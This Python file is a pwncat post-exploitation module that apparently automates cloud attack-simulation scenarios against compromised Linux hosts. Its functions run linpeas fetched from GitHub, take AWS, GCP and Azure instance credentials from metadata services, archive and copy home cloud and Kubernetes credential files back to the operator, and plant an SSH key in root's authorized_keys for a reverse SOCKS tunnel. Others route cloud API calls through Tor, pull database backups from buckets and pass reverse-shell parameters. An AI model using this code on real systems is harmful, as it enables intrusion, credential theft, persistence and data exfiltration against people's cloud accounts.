#!/usr/bin/env python3
from email.policy import default
import os
from pwncat.modules import BaseModule, Argument
from pwncat.manager import Session
from pwncat.platform.linux import Linux
from pathlib import Path
import subprocess
import shutil
import tarfile
import base64
from datetime import datetime


class Module(BaseModule):
    """ 
    Responder module - use TASK environment variable to execute specific workflow 
    """
    """
    Usage: run responder 
    """
    PLATFORM = [Linux]
    ARGUMENTS = {
        "reverse_shell_host": Argument(
            str,
            help="The reverse shell host, default is public ip of the host obtained by icanhazip.com",
        ),
        "reverse_shell_port": Argument(
            str,
            help="The reverse shell port.",
        ),
        "default_payload": Argument(
            str,
            help="The default payload to execute when hosts connect.",
        ),

    }

    def run(self, session: Session, reverse_shell_host: str, reverse_shell_port: str, default_payload: str):
        session.log("starting module")

        session_lock = Path("/tmp/pwncat_session.lock")

        try:
            session.log("creating session lock: /tmp/pwncat_session.lock")
            session_lock.touch()

            def encode_base64(data):
                try:
                    data = str(data).encode('utf-8')
                except (UnicodeDecodeError, AttributeError):
                    pass
                return base64.b64encode(data).decode()

            def run_base64_payload(session, payload, log_name="base64_payload", cwd="/tmp", timeout=7200):
                encoded_payload = encode_base64(payload)
                session.log(f"Running payload: {encoded_payload}")
                return run_remote(session, f"/bin/bash -c 'echo {encoded_payload} | tee \"{cwd}/{log_name}\" | base64 -d | /bin/bash'", cwd, timeout)

            def run_remote(session, payload, cwd="/tmp", timeout=7200):
                return session.platform.run(payload, cwd=cwd, timeout=timeout)

            def copy_file(session, source_file, dest_file, direction):
                if direction == 'local_to_remote':
                    if Path(source_file).exists():
                        session.log(
                            f"copying from local: {source_file} => {dest_file}")
                        with open(source_file, 'rb') as f1:
                            with session.platform.open(dest_file, 'wb') as f2:
                                f2.write(f1.read())
                    else:
                        session.log(f"local file not found: {source_file}")
                elif direction == 'remote_to_local':
                    if session.platform.Path(source_file).exists():
                        session.log(
                            f"copying from remote: {source_file} => {dest_file}")
                        with session.platform.open(source_file, 'rb') as f1:
                            with open(dest_file, 'wb') as f2:
                                f2.write(f1.read())
                    else:
                        session.log(f"remote file not found: {source_file}")
                else:
                    raise ValueError(
                        "Invalid direction specified for file copy: must be 'local_to_remote' or 'remote_to_local'")

            def enum_exfil_prep_creds(csp, task_name):
                session.log("running enumerate...")
                enumerate()
                session.log("enumerate complete")
                session.log("running exfiltrate...")
                exfiltrate(csp)
                session.log("exfiltrate complete")
                session.log("running prep_local_env...")
                prep_local_env(csp=csp, task_name=task_name)
                session.log("prep_local_env complete")

            def enumerate():
                # run host enumeration
                try:
                    payload = 'curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20240218-68f9adb3/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt'
                    session.log("payload loaded and ready")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_linpeas", timeout=900)
                    session.log(result)
                except Exception as e:
                    session.log(f"Enumeration failed: {e}")
                    pass

            def exfiltrate(csp):
                # create an instance profile to exfiltrate
                if csp == "aws":
                    payload = '''opts="--no-cli-pager"
INSTANCE_PROFILE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials)
AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
AWS_SECRET_ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "SecretAccessKey" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
AWS_SESSION_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "Token" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
AWS_DEFAULT_REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
cat > .aws-ec2-instance <<EOF
AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN
AWS_DEFAULT_REGION=us-east-1
AWS_DEFAULT_OUTPUT=json
EOF
PROFILE="instance"
aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE
aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE
aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE
aws configure set region $AWS_DEFAULT_REGION --profile=$PROFILE
aws configure set output json --profile=$PROFILE'''
                    session.log("creating an instance creds profile...")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_awsconfig")
                    session.log(result)

                    # remove any pre-existing cred archived
                    if session.platform.Path('/tmp/aws_creds.tgz').exists():
                        session.platform.unlink('/tmp/aws_creds.tgz')

                    # enumerate aws creds
                    payload = 'find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\''
                    session.log("running credentials find...")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_awscredsfind")
                    session.log(result)

                    # create an archive of all aws creds
                    payload = 'tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\')'
                    session.log("payload loaded and ready")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_awscreds")
                    session.log(result)
                elif csp == "gcp":
                    # get instance metadata
                    payload = "curl \"http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text\" -H \"Metadata-Flavor: Google\" > /tmp/instance_metadata.json"
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_instancemetadata")
                    session.log(result)
                    # get instance token
                    payload = '''ACCESS_TOKEN=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | jq -r '.access_token')
echo $ACCESS_TOKEN > /tmp/instance_access_token.json
'''
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_instancetoken")
                    session.log(result)

                    # remove any pre-existing cred archived
                    if session.platform.Path('/tmp/gcp_creds.tgz').exists():
                        session.platform.unlink('/tmp/gcp_creds.tgz')

                    # enumerate gcp creds
                    payload = 'find / \( -type f -a \( -name \'credentials.json\' -a -path \'*.config/gcloud/credentials.json\' \) \)  -printf \'%P\n\''
                    session.log("running credentials find...")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_gcpcredsfind")
                    session.log(result)

                    # create an archive of all gcp creds
                    payload = 'tar -czvf /tmp/gcp_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials.json\' -a -path \'*.config/gcloud/credentials.json\' \) \)  -printf \'%P\n\')'
                    session.log("payload loaded and ready")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_gcpcreds")
                    session.log(result)
                if csp == "azure":
                    # get instance metadata
                    payload = 'curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq'
                    session.log("running instance metadata find...")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_instancemetadata")
                    session.log(result)

                    # remove any pre-existing cred archived
                    if session.platform.Path('/tmp/azure_creds.tgz').exists():
                        session.platform.unlink('/tmp/azure_creds.tgz')

                    # enumerate azure creds
                    payload = 'find / \( -type f -a \( -name \'my.azureauth.json\' -a -path \'*.azure/my.azureauth\' \) -o \( -name \'azureProfile.json\' -a -path \'*.azure/azureProfile.json\' \) \)  -printf \'%P\n\''
                    session.log("running credentials find...")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_azurecredsfind")
                    session.log(result)

                    # create an archive of all azure creds
                    payload = 'tar -czvf /tmp/azure_creds.tgz -C / $(find / \( -type f -a \( -name \'my.azureauth\' -a -path \'*.azure/my.azureauth\' \) -o \( -name \'azureProfile.json\' -a -path \'*.azure/azureProfile.json\' \) \)  -printf \'%P\n\')'
                    session.log("payload loaded and ready")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_azurecreds")
                    session.log(result)

                # create an archive of all kube creds
                payload = 'tar -czvf /tmp/kube_creds.tgz -C / $(find / \( -type f -a \( -name \'config\' -a -path \'*.kube/config\' \) \)  -printf \'%P\n\')'
                session.log("payload loaded and ready")
                result = run_base64_payload(
                    session=session, payload=payload, log_name="payload_kubecreds")
                session.log(result)

                # copy files
                files = [f"/tmp/{csp}_creds.tgz",
                         "/tmp/kube_creds.tgz",
                         "/tmp/linpeas.txt",
                         "/tmp/instance_access_token.json",
                         "/tmp/instance_metadata.json"]
                for file in files:
                    copy_file(
                        session, source_file=file, dest_file=f'/tmp/{hostname}_{os.path.basename(file)}', direction='remote_to_local')
                    if session.platform.Path(file).exists():
                        session.platform.Path(file).unlink()

            def credentialed_access_tor(csp, jobname, cwd, script, args=""):
                # start torproxy docker
                if not csp in ["aws", "gcp", "azure"]:
                    raise Exception(f'Unknown csp used {csp}')

                if task_name == "scan2kubeshell":
                    container = f'ghcr.io/credibleforce/proxychains-{csp}-cli:main'
                else:
                    container = f'ghcr.io/credibleforce/proxychains-scoutsuite-{csp}:main'
                try:
                    payload = encode_base64(
                        'docker stop torproxy || true; docker rm torproxy || true; docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy')
                    session.log(f"Running payload: {payload}")
                    result = subprocess.run(
                        ['/bin/bash', '-c', f'echo {payload} | tee /tmp/payload_{jobname}_torproxy | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
                    session.log(result)

                    if result.returncode != 0:
                        session.log('The bash script encountered an error.')
                    else:
                        session.log("successfully started torproxy docker.")
                        session.log(
                            f"stopping and removing and {script} tunnelled container proxychains-{jobname}-{csp}...")
                        payload = encode_base64(
                            f'docker rm --force proxychains-{jobname}-{csp}')
                        session.log(f"Running payload: {payload}")
                        result = subprocess.run(
                            ['/bin/bash', '-c', f'echo {payload} | tee /tmp/payload_{jobname} | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
                        session.log(result)

                        if result.returncode != 0:
                            session.log(
                                'The bash script encountered an error.')

                        session.log(
                            f"running {script} via torproxy tunnelled container...")

                        # assume credentials prep added creds to local home
                        if csp == "aws":
                            local_creds = str(Path.joinpath(
                                Path.home(), Path(".aws")))
                            container_creds = "/root/.aws"
                        elif csp == "gcp":
                            local_creds = str(Path.joinpath(
                                Path.home(), Path(".config/gcloud")))
                            container_creds = "/root/.config/gcloud"
                        elif csp == "azure":
                            local_creds = str(Path.joinpath(
                                Path.home(), Path(".azure")))
                            container_creds = "/root/.azure"

                        local_kube_creds = str(Path.joinpath(
                            Path.home(), Path(".kube")))
                        container_kube_creds = "/root/.kube"

                        session.log(f"Starting tor tunneled docker...")
                        payload = encode_base64(
                            f'export TORPROXY="$(docker inspect -f \'{{{{range .NetworkSettings.Networks}}}}{{{{.IPAddress}}}}{{{{end}}}}\' torproxy)"; docker run --rm --name=proxychains-{jobname}-{csp} --link torproxy:torproxy -e TORPROXY=$TORPROXY -v "/tmp":"/tmp" -v "{local_creds}":"{container_creds}" -v "{local_kube_creds}":"{container_kube_creds}" -v "{cwd}":"/{jobname}" {container} /bin/bash /{jobname}/{script} {args}')
                        session.log(f"Running payload: {payload}")
                        result = subprocess.run(
                            ['/bin/bash', '-c', f'echo {payload} | tee /tmp/payload_{jobname} | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
                        session.log(f'Return Code: {result.returncode}')
                        session.log(f'Output: {result.stdout}')
                        session.log(f'Error Output: {result.stderr}')

                        if result.returncode != 0:
                            session.log(
                                'The bash script encountered an error.')
                except Exception as e:
                    session.log(f'Error executing bash script: {e}')

            def socks_scan(session):
                result = subprocess.run(
                    ['curl', '-s', 'https://icanhazip.com'], cwd='/tmp', capture_output=True, text=True)
                attacker_ip = result.stdout
                session.log(f'Attacker IP: {attacker_ip}')

                # get the attacker lan
                payload = 'ip -o -f inet addr show | awk \'/scope global/ {print $4}\' | head -1'
                result = run_base64_payload(
                    session=session, payload=payload, log_name="payload_attackerlan")
                target_lan = bytes(result.stdout).decode().strip()
                session.log(f'Target LAN: {target_lan}')

                # transfer files from target to attacker
                session.log("copying private key to target...")
                copy_file(
                    session, source_file='/home/socksuser/.ssh/socksuser_key', dest_file='/tmp/sockskey', direction='local_to_remote')
                result = run_remote(
                    session, "/bin/bash -c 'chmod 0600 /tmp/sockskey'")
                session.log("adding public key to authorized on target...")
                copy_file(
                    session, source_file='/home/socksuser/.ssh/socksuser_key.pub', dest_file='/root/.ssh/authorized_keys', direction='local_to_remote')

                # create socksproxy on target
                session.log('starting socksproxy on target...')
                payload = 'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -D 9050 localhost'
                result = run_base64_payload(
                    session=session, payload=payload, log_name="payload_starttargetsocks")
                session.log(result)

                # forward local socksproxy to attacker
                session.log('forwarding target socksproxy to attacker...')
                payload = f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -R 9050:localhost:9050 socksuser@{attacker_ip}'
                result = run_base64_payload(
                    session=session, payload=payload, log_name="payload_startattackersocks")
                session.log(result)

                # run nmap scan via proxychains
                session.log('running proxychains nmap...')
                result = subprocess.run(['proxychains', 'nmap', '-Pn', '-sT', '-T2', '-oX', 'scan.xml',
                                        '-p22,80,443,1433,3306,5000,5432,5900,6379,8000,8080,8088,8090,8091,9200,27017', target_lan], cwd='/tmp', capture_output=True, text=True)
                session.log(result)

                # kill ssh socksproxy and portforward
                session.log('killing ssh socksproxy and portforward...')
                result = run_remote(
                    session, 'kill -9 $(pgrep "^ssh .* /tmp/sockskey" -f)')
                session.log(result)

                # remove temporary archive from target
                if session.platform.Path('/tmp/sockskey').exists():
                    session.platform.Path('/tmp/sockskey').unlink()

            def prep_local_env(task_name, csp=None):
                # create work directory
                task_path = Path(f"/{task_name}")
                if task_path.exists() and task_path.is_dir():
                    shutil.rmtree(task_path)
                task_path.mkdir(parents=True)

                if csp == "aws":
                    # create aws directory
                    aws_dir = Path.joinpath(Path.home(), Path(".aws"))
                    if not aws_dir.exists():
                        # shutil.rmtree(aws_dir)
                        aws_dir.mkdir(parents=True)

                    # extract the first set aws creds
                    if Path(f'/tmp/{hostname}_aws_creds.tgz').exists():
                        file = tarfile.open(f'/tmp/{hostname}_aws_creds.tgz')
                        for m in file.getmembers():
                            if m.isfile() and (m.path.endswith('/.aws/credentials') or m.path.endswith('/.aws/config')):
                                session.log(
                                    f"extracting: {m.path} => {task_path}")
                                file.extract(m, task_path)
                                src_file = Path.joinpath(
                                    task_path, Path(m.path))
                                dst_file = Path.joinpath(
                                    aws_dir, Path(os.path.basename(m.path)))
                                session.log(
                                    f"copying: {src_file} => {dst_file}")
                                shutil.copy2(src_file, dst_file)
                    else:
                        session.log(
                            f"aws creds not found: /tmp/{hostname}_aws_creds.tgz")

                    payload = encode_base64(
                        f'aws configure list-profiles')
                    session.log(f"Running payload: {payload}")
                    result = subprocess.run(
                        ['/bin/bash', '-c', f'echo {payload} | tee /tmp/payload_checkprofiles | base64 -d | /bin/bash'], cwd=task_path, capture_output=True, text=True)
                    session.log(result)

                    payload = encode_base64(
                        f'aws configure list --profile=default')
                    session.log(f"Running payload: {payload}")
                    result = subprocess.run(
                        ['/bin/bash', '-c', f'echo {payload} | tee /tmp/payload_checkdefault | base64 -d | /bin/bash'], cwd=task_path, capture_output=True, text=True)
                    session.log(result)
                elif csp == "gcp":
                    # create aws directory
                    # ~/.config/gcloud/credentials.json
                    gcp_dir = Path.joinpath(
                        Path.home(), Path(".config"), Path("gcloud"))
                    if not gcp_dir.exists():
                        gcp_dir.mkdir(parents=True)

                    # extract the first set gcp creds
                    if Path(f'/tmp/{hostname}_gcp_creds.tgz').exists():
                        file = tarfile.open(f'/tmp/{hostname}_gcp_creds.tgz')
                        for m in file.getmembers():
                            if m.isfile() and m.path.endswith('/.config/gcloud/credentials.json') and (m.path.startswith('root') or m.path.startswith('home')):
                                session.log(
                                    f"extracting: {m.path} => {task_path}")
                                file.extract(m, task_path)
                                src_file = Path.joinpath(
                                    task_path, Path(m.path))
                                dst_file = Path.joinpath(
                                    gcp_dir, Path(os.path.basename(m.path)))
                                session.log(
                                    f"copying: {src_file} => {dst_file}")
                                shutil.copy2(src_file, dst_file)
                                break
                    else:
                        session.log(
                            f"gcp creds not found: /tmp/{hostname}_gcp_creds.tgz")
                elif csp == "azure":
                    # create aws directory
                    azure_dir = Path.joinpath(Path.home(), Path(".azure"))
                    if not azure_dir.exists():
                        # shutil.rmtree(azure_dir)
                        azure_dir.mkdir(parents=True)

                    # extract the first set azure creds
                    if Path(f'/tmp/{hostname}_azure_creds.tgz').exists():
                        file = tarfile.open(f'/tmp/{hostname}_azure_creds.tgz')
                        for m in file.getmembers():
                            if m.isfile() and (m.path.endswith('/.azure/my.azureauth')):
                                session.log(
                                    f"extracting: {m.path} => {task_path}")
                                file.extract(m, task_path)
                                src_file = Path.joinpath(
                                    task_path, Path(m.path))
                                dst_file = Path.joinpath(
                                    azure_dir, Path(os.path.basename(m.path)))
                                session.log(
                                    f"copying: {src_file} => {dst_file}")
                                shutil.copy2(src_file, dst_file)
                    else:
                        session.log(
                            f"azure creds not found: /tmp/{hostname}_azure_creds.tgz")

                # copy our payload to the local working directory
                task_script = Path(f"{script_dir}/../resources/{task_name}.sh")
                shutil.copy2(task_script, task_path)

                # copy linpeas.txt into our working directory
                linpeas = Path(f'/tmp/{hostname}_linpeas.txt')
                shutil.copy2(linpeas, task_path)

                # extract the kube config if they exist
                kube_dir = Path.joinpath(
                    Path.home(), Path(".kube"))
                if not kube_dir.exists():
                    kube_dir.mkdir(parents=True)
                if Path(f'/tmp/{hostname}_kube_creds.tgz').exists():
                    file = tarfile.open(f'/tmp/{hostname}_kube_creds.tgz')
                    for m in file.getmembers():
                        if m.isfile() and (m.path.endswith('/.kube/config')):
                            session.log(f"extracting: {m.path} => {task_path}")
                            file.extract(m, task_path)
                            src_file = Path.joinpath(task_path, Path(m.path))
                            dst_file = Path.joinpath(
                                kube_dir, Path(os.path.basename(m.path)))
                            session.log(f"copying: {src_file} => {dst_file}")
                            shutil.copy2(src_file, dst_file)
                            break
                else:
                    session.log(
                        f"kube creds not found: /tmp/{hostname}_kube_creds.tgz")

            # get hostname for disk loggings
            hostname = session.platform.getenv('HOSTNAME')

            script_dir = os.path.dirname(os.path.realpath(__file__))
            session.log(f"script dir: {script_dir}")
            task_name = session.platform.getenv("TASK")
            session.log(f"task environment: {task_name}")
            if task_name == "instance2rds" or task_name == "iam2rds" or task_name == "iam2enum":
                csp = "aws"
                enum_exfil_prep_creds(csp, task_name)
                session.log("running credentialed_access_tor...")
                credentialed_access_tor(
                    csp=csp,
                    jobname=task_name,
                    cwd=f'/{task_name}',
                    script=f'{task_name}.sh',
                    args=""
                )
                session.log("credentialed_access_tor complete")
            # update to add 15 minute timeout
            elif task_name == "gcpiam2cloudsql":
                csp = "gcp"
                enum_exfil_prep_creds(csp, task_name)
                # storage not available via tor network - region exclusion so we need to do this locally :(
                payload = """
USER=$(gcloud auth list --filter=status:ACTIVE --format="value(account)" | awk -F "@" '{ print $1 }')
DEPLOYMENT=$(echo ${USER##*-})
BUCKET_URL=$(gsutil ls | grep db-backup-target-$DEPLOYMENT)
echo $BUCKET_URL
"""
                session.log("payload loaded and ready")
                result = run_base64_payload(
                    session=session, payload=payload, log_name="payload_bucket_url")
                session.log(result)
                bucket_url = bytes(result.stdout).decode().strip()
                session.log("running credentialed_access_tor...")
                credentialed_access_tor(
                    csp=csp,
                    jobname=task_name,
                    cwd=f'/{task_name}',
                    script=f'{task_name}.sh',
                    args=f"--bucket-url={bucket_url}"
                )
                payload = f"gsutil cp -r {bucket_url} /tmp 2>&1 | tee -a $LOGFILE"
                session.log("payload loaded and ready")
                result = run_base64_payload(
                    session=session, payload=payload, log_name="payload_retrieve_backup")
                session.log(result)
                session.log("credentialed_access_tor complete")
            elif task_name == "azureiam2azuresql":
                csp = "azure"
                enum_exfil_prep_creds(csp, task_name)
                # storage not available via tor network - region exclusion so we need to do this locally :(
                session.log("running credentialed_access_tor...")
                credentialed_access_tor(
                    csp=csp,
                    jobname=task_name,
                    cwd=f'/{task_name}',
                    script=f'{task_name}.sh',
                    args=""
                )
                session.log("credentialed_access_tor complete")
            elif task_name == "socksscan":
                socks_scan(session)
            elif task_name == "scan2kubeshell":
                csp = "aws"
                enum_exfil_prep_creds(csp, task_name)
                session.log("running iam2enum enumeration...")
                credentialed_access_tor(
                    csp=csp,
                    jobname="iam2enum",
                    cwd=f'/iam2enum',
                    script=f'iam2enum.sh',
                    args="--profile=default"
                )
                session.log("iam2enum enumeration complete")
                session.log(
                    "running scan2kubeshell credentialed_access_tor...")
                credentialed_access_tor(
                    csp=csp,
                    jobname=task_name,
                    cwd=f'/{task_name}',
                    script=f'{task_name}.sh',
                    args=f'--reverse-shell-host={reverse_shell_host} --reverse-shell-port={reverse_shell_port}'
                )
                session.log("credentialed_access_tor complete")

                # create an archive of all aws creds
                payload = 'tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\')'
                session.log("payload loaded and ready")
                result = run_base64_payload(
                    session=session, payload=payload, log_name="payload_awscreds")
            elif task_name == "kube2s3":
                # context here is we're inside pod that has access to s3
                enum_exfil_prep_creds(csp, task_name)
                session.log("running iam2enum enumeration...")
                # here we'll have instance credentials from the pod
                credentialed_access_tor(
                    csp=csp,
                    jobname="iam2enum",
                    cwd=f'/iam2enum',
                    script=f'iam2enum.sh',
                    args="--profile=instance"
                )
                session.log("iam2enum enumeration complete")

                tmp_dir = Path("/tmp")
                # create work directory
                task_path = Path(f"/{task_name}")
                if task_path.exists() and task_path.is_dir():
                    shutil.rmtree(task_path)
                task_path.mkdir(parents=True)

                # copy our payload to the local working directory
                task_script = Path(f"{script_dir}/../resources/{task_name}.sh")
                shutil.copy2(task_script, task_path)

                with open(Path.joinpath(task_path, Path(f"{task_name}.sh")), 'r') as f:
                    payload = f.read()

                session.log("running s3 exfil payload...")
                result = run_base64_payload(
                    session=session, payload=payload, log_name="payload_kube2s3")
                session.log(result)

                files = ["/tmp/kube_bucket.tgz", "/tmp/kube2s3.log"]
                file_list = ", ".join(files)
                session.log(
                    f"copying scan results: {file_list}...")
                for file in files:
                    copy_file(session, source_file=file,
                              dest_file=f'/tmp/{os.path.basename(file)}', direction='remote_to_local')
                    if session.platform.Path(file).exists():
                        session.platform.Path(file).unlink()
                session.log("done")

                # extract kube s3 prod files
                if Path(f'/tmp/{os.path.basename(files[0])}').exists():
                    file = tarfile.open(f'/tmp/{os.path.basename(files[0])}')
                    for m in file.getmembers():
                        if m.isfile():
                            session.log(f"extracting: {m.path} => {task_path}")
                            file.extract(m, task_path)
                            src_file = Path.joinpath(task_path, Path(m.path))
                            dst_file = Path.joinpath(
                                tmp_dir, Path(os.path.basename(m.path)))
                            session.log(f"copying: {src_file} => {dst_file}")
                            shutil.copy2(src_file, dst_file)
                else:
                    session.log(
                        f"kube tar not found: /tmp/{os.path.basename(files[0])}")
            else:
                result = run_remote(session, default_payload)
                session.log(result)

            session.log("Removing sesssion lock...")
            if session_lock.exists():
                session_lock.unlink()

            session.log("Done.")
        except Exception as e:
            session.log(f'Error executing bash script: {e}')
            pass

        session.log("Backup pwncat.log...")
        pwncat_log = Path("/tmp/pwncat.log")
        if pwncat_log.exists():
            dest_log = Path(
                f"/tmp/{datetime.utcnow().strftime('%Y%m%d%H%M%S')}_pwncat.log")
            session.log(
                f"Moving successful session log {pwncat_log.as_posix()} => {dest_log.as_posix()}")
            pwncat_log.rename(dest_log)

        if session_lock.exists():
            session_lock.unlink()
